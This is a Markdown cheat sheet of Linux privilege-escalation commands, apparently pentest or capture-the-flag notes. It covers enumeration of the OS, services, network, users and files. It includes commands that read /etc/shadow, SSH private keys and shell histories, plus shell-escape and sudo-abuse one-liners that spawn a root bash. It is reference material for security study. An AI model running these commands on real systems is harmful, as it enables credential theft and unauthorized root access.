# Linux Privilege Escalation

## PrivEsc Enumerations Scripts
```bash

```

## Operating System
```bash
# Distrubution and version
cat /etc/issue
cat /etc/*-release
lsb_release -a

# Kernel Version -- Is it 64 bit?
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-

# Check for ENV vars
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env

# Printer 
lpstat -a
```

## Applications and Services
```bash
# Running Services and Applications
ps aux
ps -ef
top
cat /etc/services
ps aux | grep root
ps -ef | grep root

# Installed Applications
ls -alh /usr/bin/
ls -alh /sbin/
ls -alh /usr/local/
ls -alh /usr/local/src
ls -alh /usr/local/bin
ls -alh /opt/
ls -alh /home
ls -alh /var/
ls -alh /usr/src/

# Debian
dpkg -l

# CentOS/OpenSuse/Fedora/RHEL
rpm -qa

# OpenBSD/FreeBSD
pkg_info
# Versions of Important Applications
gcc -v
mysql --version
java -version
python --version
ruby -v:wq
perl -v

# Installed Configurations
cat /etc/syslog.conf

## Web Server
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf

## PHP
/etc/php5/apache2/php.ini

## Printer
cat /etc/cups/cupsd.conf

## MySQL
cat /etc/my.conf

## List All
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'

# Scheduled Jobs
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# Plain-text usernames and passwords
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

```

## Network and Comms
```bash
# NICs and Networks
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

# Connected Users and Hosts
lsof -nPi
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

# Cached IP or MAC
arp -a
route -n
/sbin/route -nee
ip ro show


# Network Config Settings
cat /etc/resolv.conf
cat /etc/hosts
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
iptables -t nat -L
hostname
dnsdomainname

# Local Connection Only
netstat -tupan
netstat -anlp
netstat -ano

# Is Tunneling Possible
ssh -D 127.0.0.1:9050 -N [username]@[ip] 
proxychains ifconfig

# SSH Tunneling
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
```

## Sensitive Information and Users
```bash
# Identify current users and users in the the system
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

# Display Sesnstive Files
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
ls -ahlR /root/
ls -ahlR /home/

# Passwords in Files?
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg

# Dump Local,LDAP,NIS Password Hashes
getent passwd

# User History Credentials and Activity
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history

# User Profile and Mail
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
cat /etc/aliases
getent aliases

# Accessable Private Keys
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

## File Systems
```bash
# Writable Files in /etc/
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone

# Hidden Files on Website
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/

# /var Structure
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd 
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

# Local Logs
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp

# Break Out of Shell
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
vi -> :sh or :!UNIX_command

# Mounted filesystems
mount
df -h

# Any Unmounted Filesystems
cat /etc/fstab

# NFS Shares
showmount -e 192.168.1.101
mount 192.168.1.101:/ /tmp/

# Find setuid Files
find / -perm +4000 -type f
find / -perm +4000 -uid 0 -type f

# Sticky Bits, SUID, GUID
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID

## SUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it

## GUID
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

# Write and Execute Permissions
find / -perm 777 # Directories
find / -writable -type d 2>/dev/null        # world-writeable folders
find / -perm -222 -type d 2>/dev/null      # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
find / -perm -o+x -type d 2>/dev/null    # world-executable folders
find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders

# Abusing sudo-rights
awk 'BEGIN {system("/bin/bash")}'
sudo find / -exec bash -i \;

find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
``
